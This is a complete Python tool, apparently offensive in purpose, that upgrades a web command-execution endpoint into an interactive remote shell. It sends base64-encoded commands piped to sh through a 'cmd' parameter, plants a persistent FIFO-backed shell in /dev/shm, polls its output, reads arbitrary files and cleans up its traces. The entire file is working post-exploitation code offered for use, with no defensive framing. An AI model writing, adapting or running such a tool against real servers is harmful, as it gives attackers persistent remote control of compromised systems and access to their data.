#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultra-fast Remote Interactive Shell (Arrow keys + readline support)
Author: g3kzzz edition (final improvements)
- Ensures arrow keys / line editing work:
    * Uses prompt_toolkit if available (recommended).
    * Falls back to Python readline (history & arrow keys) if prompt_toolkit is not installed.
- Ctrl-C sends SIGINT to the remote foreground process (without dropping the persistent shell).
- Ctrl-L clears screen (prompt_toolkit and readline-compatible).
- Clean English UI, no extra blank lines, minimal latency.
"""
from __future__ import annotations
import os
import sys
import time
import signal
import threading
import argparse
import re
import requests
from base64 import b64encode
from random import randrange
from urllib.parse import quote_plus

# --------------------
# Prefer prompt_toolkit, otherwise use readline fallback
# --------------------
USE_PROMPT_TOOLKIT = False
try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.key_binding import KeyBindings
    from prompt_toolkit.history import InMemoryHistory
    USE_PROMPT_TOOLKIT = True
except Exception:
    USE_PROMPT_TOOLKIT = False

USE_READLINE = False
if not USE_PROMPT_TOOLKIT:
    try:
        import readline
        USE_READLINE = True
    except Exception:
        USE_READLINE = False

# --------------------
# Constants & helpers
# --------------------
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"
CLEAR = "\033[2J\033[H"

HTML_TAGS = ["h1","h2","h3","b","i","strong","em","pre","div","span","p","br"]
HTML_TAGS_RE = re.compile(r"</?(" + "|".join(HTML_TAGS) + r")[^>]*>", re.IGNORECASE)
MARKER_RE = re.compile(r"^(__CTX_|__CMDSYNC_).*", re.M)

def colorize(text: str, bold: bool = False) -> str:
    return f"{MAGENTA}{BOLD if bold else ''}{text}{RESET}"

def strip_html(text: str) -> str:
    """Elimina solo etiquetas HTML definidas, dejando todo lo demÃ¡s intacto"""
    if not text:
        return ""
    text = text.replace("&nbsp;", " ")
    text = HTML_TAGS_RE.sub("", text)
    return text

def clean_output(text: str) -> str:
    if not text:
        return ""
    s = strip_html(text)
    lines = []
    for ln in s.splitlines():
        if MARKER_RE.match(ln):
            continue
        lines.append(ln.rstrip())
    return "\n".join(lines).strip()

def load_cookies_file(path: str) -> dict:
    cookies = {}
    try:
        with open(path, "r") as fh:
            for line in fh:
                line = line.strip()
                if not line or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                cookies[k.strip()] = v.strip()
    except Exception:
        pass
    return cookies

# --------------------
# HTTP primitives
# --------------------
def send_request(session: requests.Session, url: str, payload: str, timeout: float = 4.0) -> str:
    try:
        if url.endswith("="):
            encoded = quote_plus(payload, safe="/%:@()[]!$&'*,;=")
            r = session.get(url + encoded, timeout=timeout)
        else:
            r = session.get(url, params={"cmd": payload}, timeout=timeout)
        return clean_output(r.text)
    except requests.RequestException as e:
        return f"[!] HTTP error: {e}"

def run_cmd(session: requests.Session, url: str, cmd: str) -> str:
    b64 = b64encode(cmd.encode()).decode()
    payload = f'echo "{b64}" | base64 -d | sh'
    return send_request(session, url, payload, timeout=5.0)

def write_cmd(session: requests.Session, url: str, stdin: str, cmd: str) -> str:
    b64 = b64encode(cmd.encode()).decode()
    payload = f'echo "{b64}" | base64 -d > {stdin}'
    return send_request(session, url, payload, timeout=5.0)

def read_file(session: requests.Session, url: str, path: str) -> str:
    return run_cmd(session, url, f"/bin/cat {path}")

# --------------------
# Reader thread
# --------------------
class Reader(threading.Thread):
    def __init__(self, session: requests.Session, url: str, stdout: str,
                 interval: float = 0.06, settle: float = 0.03):
        super().__init__(daemon=True)
        self.session = session
        self.url = url
        self.stdout = stdout
        self.interval = interval
        self.settle = settle
        self._stop = threading.Event()
        self._suspend = threading.Event()
        self._lock = threading.Lock()
        self.last = ""
        self.printed_event = threading.Event()

    def run(self):
        while not self._stop.is_set():
            if self._suspend.is_set():
                time.sleep(self.interval)
                continue
            try:
                raw = read_file(self.session, self.url, self.stdout)
                filtered = raw or ""
                if filtered == self.last:
                    time.sleep(self.interval)
                    continue

                deadline = time.time() + self.settle
                current = filtered
                while time.time() < deadline:
                    time.sleep(self.settle / 4)
                    more = read_file(self.session, self.url, self.stdout) or ""
                    if more != current:
                        current = more
                        deadline = time.time() + self.settle

                delta = ""
                if self.last and current.startswith(self.last):
                    delta = current[len(self.last):]
                else:
                    delta = current

                delta = delta.strip("\n")
                if delta:
                    with self._lock:
                        sys.stdout.write(delta + ("\n" if not delta.endswith("\n") else ""))
                        sys.stdout.flush()
                    self.printed_event.set()
                self.last = current
            except Exception:
                time.sleep(self.interval)

    def stop(self):
        self._stop.set()

    def suspend(self):
        self._suspend.set()

    def resume(self):
        self._suspend.clear()

    def clear_event(self):
        self.printed_event.clear()

    def wait_event(self, timeout: float = 2.0) -> bool:
        return self.printed_event.wait(timeout=timeout)

# --------------------
# Safe synchronous reads
# --------------------
def exec_to_tmp(session: requests.Session, url: str, stdin: str, cmd: str, timeout: float = 1.5) -> str:
    sid = randrange(100000, 999999)
    tmp = f"/dev/shm/ctx.{sid}"
    wrapped = f"({cmd}) > {tmp} 2>&1"
    write_cmd(session, url, stdin, wrapped + "\n")
    deadline = time.time() + timeout
    out = ""
    while time.time() < deadline:
        time.sleep(0.06)
        out = read_file(session, url, tmp)
        if out and not out.startswith("[!] HTTP error"):
            break
    try:
        run_cmd(session, url, f"/bin/rm -f {tmp}")
    except Exception:
        pass
    return out or ""

# --------------------
# Setup / cleanup remote FIFO shell
# --------------------
def setup_shell(session: requests.Session, url: str, stdin: str, stdout: str) -> None:
    cmd = f"/bin/rm -f {stdin} {stdout}; /bin/mkfifo {stdin}; /bin/touch {stdout}; /bin/tail -f {stdin} | /bin/sh > {stdout} 2>&1 &"
    run_cmd(session, url, cmd)

def cleanup(session: requests.Session, url: str, stdin: str, stdout: str) -> None:
    try:
        run_cmd(session, url, f"/bin/rm -f {stdin} {stdout}")
    except Exception:
        pass

# --------------------
# Ctrl-C handling
# --------------------
def send_remote_sigint(session: requests.Session, url: str, stdin: str) -> None:
    try:
        payload = 'printf "\\x03" > ' + stdin
        run_cmd(session, url, payload)
    except Exception:
        pass
    try:
        run_cmd(session, url, "pidof sh >/dev/null 2>&1 && pgrep -n -P $(pidof sh) >/dev/null 2>&1 && pkill -SIGINT -n -P $(pidof sh) || true")
    except Exception:
        pass

# --------------------
# Remote context
# --------------------
def get_remote_context(session: requests.Session, url: str, stdin: str, reader: Reader) -> tuple[str, str, str]:
    reader.suspend()
    try:
        out = exec_to_tmp(session, url, stdin, "whoami; hostname -s || hostname; pwd", timeout=1.2)
        parts = [p.strip() for p in (out or "").splitlines() if p.strip()]
        while len(parts) < 3:
            parts.append("unknown")
        return parts[0], parts[1], parts[2]
    finally:
        reader.resume()

# --------------------
# Input helpers
# --------------------
def make_prompt_session():
    kb = KeyBindings()
    @kb.add("c-l")
    def _(event):
        print(CLEAR, end="")
    @kb.add("c-c")
    def _(event):
        event.app.exit(exception=KeyboardInterrupt, style="class:aborting")
    session = PromptSession(history=InMemoryHistory(), key_bindings=kb)
    return session

def setup_readline_history():
    try:
        import readline
        histfile = os.path.expanduser("~/.g3kzzz_shell_history")
        try:
            readline.read_history_file(histfile)
        except Exception:
            pass
        import atexit
        atexit.register(lambda: readline.write_history_file(histfile))
    except Exception:
        pass

# --------------------
# Interactive loop
# --------------------
def interactive_loop(session: requests.Session, url: str, stdin: str, stdout: str, interval: float):
    reader = Reader(session, url, stdout, interval=interval, settle=max(0.02, interval/3))
    reader.start()
    def sigint_handler(sig, frame):
        send_remote_sigint(session, url, stdin)
        sys.stdout.write("\n[!] Sent SIGINT to remote process (use 'exit' to quit)\n")
        sys.stdout.flush()
    signal.signal(signal.SIGINT, sigint_handler)

    if USE_PROMPT_TOOLKIT:
        p_session = make_prompt_session()
        prompt_func = lambda prompt_text: p_session.prompt(prompt_text)
    else:
        if USE_READLINE:
            setup_readline_history()
        def prompt_func(prompt_text):
            try:
                return input(prompt_text)
            except KeyboardInterrupt:
                send_remote_sigint(session, url, stdin)
                sys.stdout.write("\n[!] Sent SIGINT to remote process (use 'exit' to quit)\n")
                sys.stdout.flush()
                return ""
            except EOFError:
                return ""

    try:
        while True:
            try:
                user, host, cwd = get_remote_context(session, url, stdin, reader)
            except Exception:
                user, host, cwd = ("unknown", "unknown", "~")
            sys.stdout.write(colorize(f"[{user} â {host}] - [{cwd}]\n", True))
            sys.stdout.flush()
            raw = prompt_func(colorize(">>> "))
            raw = (raw or "").strip()
            if not raw:
                continue
            if raw.lower() in ("exit", "quit"):
                sys.stdout.write("[*] Exiting and cleaning up...\n")
                sys.stdout.flush()
                reader.stop()
                cleanup(session, url, stdin, stdout)
                time.sleep(0.05)
                return
            if raw.lower() == "clear":
                sys.stdout.write(CLEAR)
                sys.stdout.flush()
                continue
            reader.clear_event()
            if raw.startswith("cd"):
                write_cmd(session, url, stdin, raw + "\n")
                time.sleep(0.06)
                continue
            write_cmd(session, url, stdin, raw + "\n")
            _ = reader.wait_event(timeout=2.0)
            time.sleep(0.02)
    finally:
        try:
            reader.stop()
            cleanup(session, url, stdin, stdout)
        except Exception:
            pass

# --------------------
# Entrypoint
# --------------------
def main():
    parser = argparse.ArgumentParser(prog="term_http", description="Ultra-fast remote shell (g3kzzz edition)")
    parser.add_argument("--url", required=True, help="Target URL, end with '=' if direct payload")
    parser.add_argument("--cookies", help="Cookie file (key=value per line)")
    parser.add_argument("--interval", type=float, default=0.06, help="Polling interval in seconds (default: 0.06)")
    parser.add_argument("--user-agent", help="Custom HTTP User-Agent")
    args = parser.parse_args()

    sess = requests.Session()
    sess.headers.update({"User-Agent": args.user_agent or "g3kzzz-ultrafast-shell/4.0"})
    if args.cookies:
        sess.cookies.update(load_cookies_file(args.cookies))

    stdin = f"/dev/shm/input.{randrange(1000,9999)}"
    stdout = f"/dev/shm/output.{randrange(1000,9999)}"

    sys.stdout.write(colorize("[*] Starting remote shell...\n", True))
    sys.stdout.flush()
    setup_shell(sess, args.url, stdin, stdout)
    interactive_loop(sess, args.url, stdin, stdout, args.interval)

if __name__ == "__main__":
    main()

